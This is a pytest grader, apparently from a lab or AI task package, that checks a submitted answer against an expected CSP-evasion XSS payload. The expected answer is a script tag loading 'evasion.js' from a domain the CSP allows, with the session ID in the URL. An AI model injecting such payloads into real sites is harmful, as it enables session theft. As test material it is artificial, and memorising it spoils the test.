# test_final_state.py

import os
import json
import urllib.request
import ssl
import pytest

def test_evasion_payload_correct():
    payload_file = "/home/user/final_payload.txt"
    assert os.path.isfile(payload_file), f"The final payload file {payload_file} does not exist."

    # Setup SSL context to authenticate with the local server using the valid client cert
    context = ssl.create_default_context(cafile="/home/user/ca/root.crt")
    try:
        context.load_cert_chain(
            certfile="/home/user/target_certs/client_alpha.crt",
            keyfile="/home/user/target_certs/client_alpha.key"
        )
    except Exception as e:
        pytest.fail(f"Failed to load valid client certificate for verification: {e}")

    req = urllib.request.Request("https://127.0.0.1:8443/api/auth")

    try:
        with urllib.request.urlopen(req, context=context) as response:
            # Extract session ID from JSON response
            body = response.read().decode('utf-8')
            try:
                data = json.loads(body)
            except json.JSONDecodeError:
                pytest.fail("Server did not return valid JSON.")

            session_id = data.get("session_id")
            assert session_id, "Could not extract 'session_id' from the server's JSON response."

            # Extract external domain from Content-Security-Policy header
            csp_header = response.headers.get("Content-Security-Policy", "")
            assert csp_header, "Server did not return a Content-Security-Policy header."

            domain = None
            directives = csp_header.split(';')
            for directive in directives:
                directive = directive.strip()
                if directive.startswith('script-src'):
                    parts = directive.split()
                    for part in parts[1:]:
                        if part.startswith('http://') or part.startswith('https://'):
                            domain = part
                            break

            assert domain, "Could not extract an allowed external domain from the CSP script-src directive."

            # Construct the expected payload string dynamically based on server truth
            expected_payload = f'<script src="{domain}/evasion.js?session={session_id}"></script>'

            # Read the student's payload
            with open(payload_file, 'r') as f:
                actual_payload = f.read().strip()

            assert actual_payload == expected_payload, (
                f"Payload mismatch in {payload_file}.\n"
                f"Expected: {expected_payload}\n"
                f"Actual:   {actual_payload}"
            )

    except urllib.error.URLError as e:
        pytest.fail(f"Failed to communicate with the staging server to derive expected state: {e}")